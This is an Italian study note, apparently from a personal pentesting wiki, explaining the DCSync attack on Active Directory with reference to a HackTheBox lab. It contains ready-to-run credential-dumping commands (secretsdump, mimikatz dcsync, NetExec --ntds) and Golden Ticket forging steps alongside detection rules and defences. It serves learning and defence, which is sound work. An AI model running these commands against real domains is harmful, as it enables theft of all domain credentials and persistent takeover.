---

tags:

- dcsync
- active-directory
- credential-dumping
- replication
- kerberos
- golden-ticket
- hacking-exposed-7
- post-exploit aliases:
- DCSync attack
- DRSUAPI abuse
- replication abuse

---

# DCSync — Impersonare un Domain Controller per Rubare Tutti gli Hash

## 1. Il concetto

> **DCSync** è una tecnica che permette a un attaccante con permessi specifici di **richiedere a un Domain Controller la replica dei segreti del dominio**, ricevendo gli hash NT di tutti gli utenti — incluso `krbtgt`.

Non è un exploit di una vulnerabilità — è **abuso di una feature legittima**: il protocollo che i DC usano tra loro per sincronizzarsi.

> [!abstract] Il pattern centrale Un Domain Controller chiede a un altro DC: "dammi tutto quello che sai". Il protocollo (DRSUAPI) è progettato per fidarsi del richiedente se ha i permessi giusti. L'attaccante non rompe il protocollo — si **finge un DC** e chiede la sincronizzazione.

---

## 2. Il pattern di Sauna — quello che hai già fatto

Su [[htb_sauna]] hai eseguito DCSync end-to-end:

```
1. Shell come svc_loanmgr (credenziali da Winlogon registry)
   ↓
2. BloodHound CE: visto path "svc_loanmgr → DCSync rights → corp.local"
   archi GetChanges + GetChangesAll
   ↓
3. impacket-secretsdump corp.local/svc_loanmgr:Password@10.10.10.175
   ↓
4. Output: NT hash di Administrator + tutti gli altri utenti
   ↓
5. Pass-the-Hash con evil-winrm come Administrator → ROOT FLAG
```

Quello che faceva `svc_loanmgr` non era "hackare" il DC — gli stava semplicemente chiedendo dei dati, e il DC glieli ha dati perché aveva i permessi di farlo.

---

## 3. Il meccanismo tecnico — DRSUAPI

**MS-DRSR** (Directory Replication Service Remote Protocol), implementato in **DRSUAPI**, è il protocollo che gestisce la replica tra Domain Controllers.

```
DC1                                     DC2
 │                                       │
 │── DRSGetNCChanges Request ──────────→│
 │   (richiesta di sync)                │
 │                                       │
 │←──── Reply con segreti ───────────────│
 │      (hash NT, password history,     │
 │       Kerberos keys, ecc.)           │
 │                                       │
```

L'attaccante con i permessi giusti può **fare la stessa richiesta** che farebbe un DC legittimo:

```
Attaccante (con svc_loanmgr)                    DC
 │                                              │
 │── DRSGetNCChanges Request ─────────────────→│
 │   "Sono un DC, dammi i segreti"             │
 │                                              │
 │←──── Reply con TUTTI gli hash ────────────────│
 │      (incluso krbtgt e Administrator)        │
```

Il DC non distingue tra una richiesta da un DC reale e una richiesta da un client che ha i permessi necessari.

---

## 4. I permessi che servono

DCSync richiede **DUE permessi** sul oggetto dominio (root object):

|Permesso|GUID|Cosa permette|
|---|---|---|
|**DS-Replication-Get-Changes**|`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`|Richiedere replica di oggetti non-secret|
|**DS-Replication-Get-Changes-All**|`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`|Richiedere replica **inclusi i segreti** (hash, password)|

Entrambi i permessi sono necessari. Solo il primo → ottieni metadati ma non hash. Solo il secondo non esiste senza il primo. Insieme → DCSync completa.

> [!note] Un terzo permesso opzionale Esiste anche **DS-Replication-Get-Changes-In-Filtered-Set** (`89e95b76-444d-4c62-991a-0facbeda640c`), usato per i Read-Only Domain Controllers (RODC). Su attacchi reali raramente serve.

### Chi ha questi permessi di default?

```
Default in Active Directory:
- Domain Controllers ✓ (ovviamente)
- Domain Admins ✓
- Enterprise Admins ✓
- Administrators (built-in) ✓
```

Tutto qua. Nessun altro dovrebbe avere DCSync rights.

### La misconfiguration tipica

DCSync nei pentest reali emerge quando:

- **Service account** ha ricevuto questi permessi per qualche "ragione operativa" (Exchange storico, soluzioni di backup, sync tools, ecc.)
- **Account di automazione** che fanno qualcosa di replica-related
- **Gruppi annidati** dove qualcuno ha aggiunto un utente a un gruppo che ha questi permessi senza rendersene conto
- **Delegation rotte** dopo migration o ristrutturazioni AD

Su Sauna, `svc_loanmgr` aveva questi permessi — probabilmente per qualche software finanziario che li richiedeva. Errore di configurazione tipico.

---

## 5. Identificare account con permessi DCSync

### Con BloodHound

Query prebuilt:

```
Find Principals with DCSync Rights
```

Su BloodHound CE puoi vedere gli archi `GetChanges` e `GetChangesAll` puntare dall'account verso il dominio. Se entrambi presenti → DCSync possibile.

Su BloodHound legacy:

```
MATCH (n)-[r:DCSync]->(d:Domain) RETURN n.name,d.name
```

### Direttamente da LDAP

```bash
# Cerca chi ha i permessi sul dominio
PowerView (PowerShell):
Get-DomainObjectAcl -ResolveGUIDs -Identity "DC=corp,DC=local" |
  Where-Object {$_.ObjectAceType -match 'Replicat'}
```

### Con NetExec

```bash
nxc ldap dc01.corp.local -u user -p pass --dc-list
nxc ldap dc01.corp.local -u user -p pass -M dcsync-checker  # se modulo disponibile
```

---

## 6. Eseguire DCSync — i tool

### impacket-secretsdump (Linux/Kali) — il preferito

Quello che hai usato su Sauna:

```bash
# Con password
impacket-secretsdump corp.local/svc_loanmgr:Password@10.10.10.175

# Con NT hash (Pass-the-Hash → DCSync)
impacket-secretsdump corp.local/user@10.10.10.175 -hashes :NTHASH

# Solo NTDS (skippa SAM/LSA locali)
impacket-secretsdump corp.local/user:pass@10.10.10.175 -just-dc

# Solo NT hash, no Kerberos keys (output più pulito)
impacket-secretsdump corp.local/user:pass@10.10.10.175 -just-dc-ntlm

# Filtra solo un utente specifico
impacket-secretsdump corp.local/user:pass@10.10.10.175 -just-dc-user Administrator
```

**Output tipico:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:HASH_KRBTGT:::
...
```

Il formato è `username:RID:LM_hash:NT_hash:::`. LM hash è sempre `aad3b...` (placeholder, LM disabilitato di default da Vista).

### Mimikatz (Windows)

```
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

### NetExec / CrackMapExec

```bash
nxc smb dc01.corp.local -u user -p pass --ntds          # dump tutto NTDS
nxc smb dc01.corp.local -u user -p pass --users          # solo lista utenti
```

> [!tip] Perché secretsdump batte mimikatz Come consolidato in sessione precedente: secretsdump usa **DRSUAPI come protocollo**, indipendente dalla versione Windows. Mimikatz invece legge LSASS in memoria → problemi di version mismatch (vedi tuo lab AD su Win11 24H2). Per DCSync, secretsdump è la scelta robusta.

---

## 7. Cosa ottieni — e perché è devastante

Dopo DCSync hai:

|Tipo di dato|A cosa serve|
|---|---|
|**NT hash di Administrator**|Pass-the-Hash → shell come Administrator su tutto il dominio|
|**NT hash di tutti gli utenti**|PtH/PtT su ognuno, password cracking offline|
|**NT hash di krbtgt**|**Golden Ticket** — il game over assoluto|
|**Kerberos keys (AES128, AES256)**|Per attacchi Kerberos puri senza NTLM|
|**Password history**|Se le password sono "Password2023", "Password2024" → pattern futuri|
|**LM hash** (se ancora presente)|Cracking trivially veloce su account legacy|

### Il vero premio: krbtgt

`krbtgt` è l'account che firma i ticket Kerberos. Il suo hash NT è la **master key del dominio**.

Con l'hash di krbtgt puoi forgiare **Golden Tickets**: TGT Kerberos validi per **qualsiasi utente** (anche inesistente, anche con privilegi inventati), validi tipicamente per **10 anni**.

```bash
# Esempio Golden Ticket con impacket
impacket-ticketer -nthash KRBTGT_NTHASH \
                  -domain-sid S-1-5-21-... \
                  -domain corp.local \
                  fakeadmin

# Poi usa il ticket
export KRB5CCNAME=fakeadmin.ccache
impacket-psexec corp.local/fakeadmin@dc01 -k -no-pass
```

**Persistenza totale**: anche se l'attacco DCSync viene scoperto e tutte le password cambiate, finché krbtgt non viene **ruotato due volte**, il Golden Ticket continua a funzionare.

> [!warning] Krbtgt rotation Per invalidare i Golden Ticket esistenti dopo una compromissione, le best practice richiedono di **ruotare il krbtgt due volte** (con un delay per la replica). La maggior parte delle aziende non lo fa mai — la password di krbtgt è statica da quando il dominio è stato creato.

---

## 8. Detection

### Event ID 4662 — il segnale chiave

DCSync genera **Event ID 4662** (Object Operation) sul DC, con due GUID specifici nell'`Properties`:

```
Event 4662 con:
- Properties contiene: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  (GetChanges)
- Properties contiene: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2  (GetChangesAll)
- Source IP NON è un DC legittimo
```

Questo pattern è **inequivocabile** = DCSync.

### Regole SIEM

Una regola Splunk/Sentinel tipica:

```
EventCode=4662 
  AND (Properties contains "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
   OR Properties contains "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
  AND SubjectUserName NOT IN [lista DC legittimi]
```

### Altri segnali

- **Connessioni DRSUAPI** (porta 135 + dinamica) da host non-DC
- **Traffico DCERPC** anomalo verso DC
- Tool noti (Mimikatz, secretsdump) nelle process command line (Event ID 4688)

---

## 9. Difese

|Difesa|Come funziona|
|---|---|
|**Audit ACL** sul dominio|Identificare account con DCSync rights non-default → revocarli|
|**Limit Domain Admin proliferation**|Meno account con privilegi → meno target|
|**PAW** (Privileged Access Workstations)|Admin di dominio operano solo da workstation dedicate isolate|
|**Tiered admin model** (Microsoft)|Tier 0 (DA) non interagisce mai con Tier 2 (workstation)|
|**Monitoring Event ID 4662**|SIEM con regola DCSync detection|
|**Network segmentation**|Le workstation non dovrebbero poter parlare DCERPC con i DC direttamente|
|**Krbtgt rotation periodica**|Riduce window di Golden Ticket persistenza|
|**Honey objects**|Account "esca" con DCSync rights monitored 24/7|

### Verifica chi ha DCSync rights nel proprio dominio

```powershell
# Su un DC, come Domain Admin
Get-ADObject -Filter * -Properties ntSecurityDescriptor |
  Select-Object Name, @{n='DACL';e={
    $_.ntSecurityDescriptor.Access |
      Where-Object {$_.ObjectType -in '1131f6aa-...','1131f6ad-...'}
  }} |
  Where-Object {$_.DACL}
```

---

## 10. Variante: DCSync senza essere admin

DCSync **non richiede** essere Domain Admin. Servono **solo i due permessi specifici** sull'oggetto dominio.

Questo è il punto chiave del vettore: spesso emerge che un account di basso profilo (service account, account di automazione) ha quei permessi per **misconfiguration**. Sauna ne è il caso scolastico.

```
svc_loanmgr → NON è Domain Admin
            → NON è in alcun gruppo privilegiato visibile  
            → MA ha DS-Replication-Get-Changes + GetChangesAll
            → Può fare DCSync
            → Game over
```

L'auditing dei permessi su oggetti AD è una delle attività più trascurate in security. DCSync emerge quasi sempre in red team engagement quando il team blue non l'ha mai esaminato.

---

## 11. Confronto con altre tecniche di credential dumping

|Tecnica|Prerequisito|Cosa ottieni|Stealth|
|---|---|---|---|
|**LSASS dump (mimikatz/pypykatz)**|Admin locale su 1 host|Credenziali utenti attualmente loggati|Media|
|**SAM dump**|SYSTEM locale|Hash account locali della macchina|Alta|
|**DCSync**|Permessi DRSUAPI su dominio|**TUTTI** gli hash del dominio|Bassa (loggato)|
|**NTDS.dit copy**|Admin DC + accesso file system|Stesso di DCSync, ma più rumoroso (VSS)|Bassissima|
|**Kerberoasting**|Account dominio|Hash TGS-REP di service account|Alta|
|**AS-REP Roasting**|Niente (unauth)|Hash AS-REP di account con DONT_REQ_PREAUTH|Alta|

DCSync è il **massimo impatto** ma richiede già un certo grado di accesso. Non è un attacco iniziale — è un'**escalation finale**.

---

## Takeaways

1. **DCSync ≠ exploit di vulnerabilità** — è abuso di una feature legittima di replica
2. **Due permessi necessari**: `GetChanges` + `GetChangesAll` sul dominio
3. Permessi di default solo a DC, Domain Admins, Enterprise Admins — qualsiasi altro account = misconfiguration
4. **secretsdump.py via DRSUAPI** è la scelta robusta (vs mimikatz che ha problemi su Windows moderno)
5. Il vero premio è **krbtgt hash → Golden Ticket** → persistenza decennale
6. **Detection chiara**: Event ID 4662 con GUID `1131f6aa-...` + `1131f6ad-...` da host non-DC
7. **Difesa primaria**: audit ACL del dominio, riduzione gruppi privilegiati, monitoring 4662
8. **BloodHound** è lo strumento standard per identificare path DCSync in red team

---

## Wiki-links

- [[HTB - Sauna]]
- [[Privilege Escalation Windows]]
- [[Lateral Movement]]
- [[Credential Dumping - LSA Secrets vs LSASS Memory]]
- [[Impacket]]
- [[bloodhound]]
- [[Golden Ticket]]
- [[kerberoasting]]
- [[GetNPUsers - AS-REP Roasting]]
- [[Pass-the-Hash]]
- [[Active Directory (AD)]]
- [[ldap]]
- [[mitre_attck]]
- [[hacking_exposed_7_windows]]